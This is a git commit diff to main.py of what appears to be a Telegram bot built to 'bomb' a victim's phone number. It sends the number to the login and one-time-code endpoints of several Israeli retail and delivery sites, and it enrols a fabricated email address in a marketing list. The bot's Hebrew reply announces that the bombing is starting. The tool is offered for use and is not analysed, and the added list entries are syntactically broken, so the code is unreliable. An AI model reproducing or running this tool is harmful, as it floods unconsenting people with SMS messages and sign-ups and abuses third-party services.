9720c0d58060cacd4c40e51a66e83d0e24c1379b
500ariel3010 <6984ariel@gmail.com>
2026-04-14 16:03:09 +0300

    Update main.py

--- main.py
+++ main.py
@@ -24,7 +24,18 @@ def attack(target):
         {"u": "https://api.yellow.co.il/v1/auth/login", "d": {"phone": target}},
         {"u": "https://wolt.com/api/v1/user/check_phone_number", "d": {"phone_number": target}},
         {"u": "https://ksp.co.il/api/v1/auth/otp", "d": {"phone": target}}
-    ]
+       {"u":  "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send": {"phoneNumber": target}},
+    {
+            "u": "https://api.flashy.app/thunder/contact?overwrite=true&primary_key=email", 
+            "d": {
+                "email": f"user_{target}@gmail.com",
+                "signup_source": "welcome",
+                "phone": target,
+                "lists": {"15304": True},
+                "popup_id": 18260,
+                "flsid": None
+            }
+        },
     for site in apis:
         try:
             requests.post(site["u"], json=site["d"], timeout=5)
@@ -36,7 +47,7 @@ def handle(m):
     target = m.text.strip()
     if target.isdigit() and len(target) >= 10:
         bot.reply_to(m, f"🚀 מתחיל להפציץ את {target}...")
-        for _ in range():
+        for _ in range(1):
             attack(target)
             time.sleep(1)
         bot.send_message(m.chat.id, "✅ הסבב הסתיים!")
